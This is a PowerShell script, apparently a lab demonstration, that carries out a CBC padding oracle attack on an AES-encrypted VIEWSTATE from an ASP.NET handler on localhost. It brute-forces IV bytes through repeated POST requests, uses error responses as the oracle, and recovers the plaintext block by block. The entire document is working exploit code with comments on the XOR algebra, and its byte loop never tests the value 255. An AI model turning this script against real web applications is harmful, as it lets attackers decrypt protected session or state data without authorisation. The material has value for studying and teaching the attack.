Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

Import-Module PowerCrypto

function TestPadding {
    param (
        [string]$CipherText
    )

    $PostData = "VIEWSTATE=$CipherText";
    try {
        $null = Invoke-WebRequest -Method Post -UseBasicParsing -Body $PostData -Uri "http://localhost:8080/EncryptionHandler.ashx"
        return $true
    } catch {
        return $false
    }
}

function ReadKey {
    Write-Host -NoNewLine "Press any key to continue..."
    $null = [Console]::ReadKey()
}

$BlockSize = 16 # AES

$WebAppRequest = Invoke-WebRequest -UseBasicParsing "http://localhost:8080/EncryptionHandler.ashx"

$Xml = [xml]$WebAppRequest.Content.Substring("<!doctype html>".Length)

$IV = @(0) * $BlockSize
$CipherText = ConvertFrom-HexString ($xml.html.form.input[0].value)

Write-Host "This is what we need to decipher:"
$CipherText | Format-HexPrettyPrint
ReadKey

for ($BlockNumber = 0; $BlockNumber -lt ($CipherText.Length / $BlockSize); $BlockNumber++) {
    $CurrentBlock = $CipherText[$(16 * $BlockNumber)..$(16 * $BlockNumber + 15)]

    $PlainTextBytes = New-Object Byte[] $BlockSize
    $InterState = New-Object Byte[] $BlockSize
    for ($IVByte = $BlockSize - 1; $IVByte -ge 0; $IVByte--) {
        [Byte]$PaddingByte = 16 - $IVByte

        $TestIV = New-Object Byte[] $BlockSize

        for ($i = 15; $i -gt $IVByte; $i--) {
            # I[n + 1] x IV[n + 1] = $PaddingByte => IV[n + 1] = $PaddingByte -bxor I[n + 1]
            $TestIV[$i] = $PaddingByte -bxor $InterState[$i]
        }

        $InterStateToGuessHex = $InterState[0..$IVByte] | ConvertTo-HexString
        if ($IVByte -lt $($BlockSize - 1)) {
            $InterStateGuessedHex = $InterState[$($IVByte + 1)..$($BlockSize - 1)] | ConvertTo-HexString
        } else {
            $InterStateGuessedHex = ""
        }

        $Found = $False
        for ([Byte]$CurrentByte = 0; $CurrentByte -lt [Byte]::MaxValue; $CurrentByte++) {

            $TestIV[$IVByte] = $CurrentByte
            $TestIVHex = ConvertTo-HexString $TestIV

            # Nice print
            Write-Host -NoNewLine "`r$InterStateToGuessHex"
            Write-Host -NoNewLine -ForegroundColor DarkGreen $InterStateGuessedHex
            Write-Host -NoNewLine -ForegroundColor DarkRed " ([$IVByte] = $("{0:X2}" -f $CurrentByte)) "

            # I needed to add the first block because the validation fails if the decrypted plain text
            # is less then 24B
            $CipherTextToTest = "00000000000000000000000000000000" + $TestIVHex + (ConvertTo-HexString $CurrentBlock)
            if (TestPadding $CipherTextToTest) {
                # I[n] x IV'[n] = $PaddingByte => I[n] = IV'[n] x $PaddingByte
                $InterState[$IVByte] = $CurrentByte -bxor $PaddingByte
                # I[n] x IV[n] = P1[n]
                $PlainTextBytes[$IVByte] = $IV[$IVByte] -bxor $InterState[$IVByte]
                $Found = $True
                break
            }
        }

        if (!$Found) {
            Write-Error "Fail"
            exit
        }
    }
    $IV = $CurrentBlock

    # Nice print
    Write-Host -NoNewLine "`rInter state: "
    Write-Host -ForegroundColor DarkGreen "$($InterState | ConvertTo-HexString)           "
    $PlainTextBytes | Format-HexPrettyPrint
}
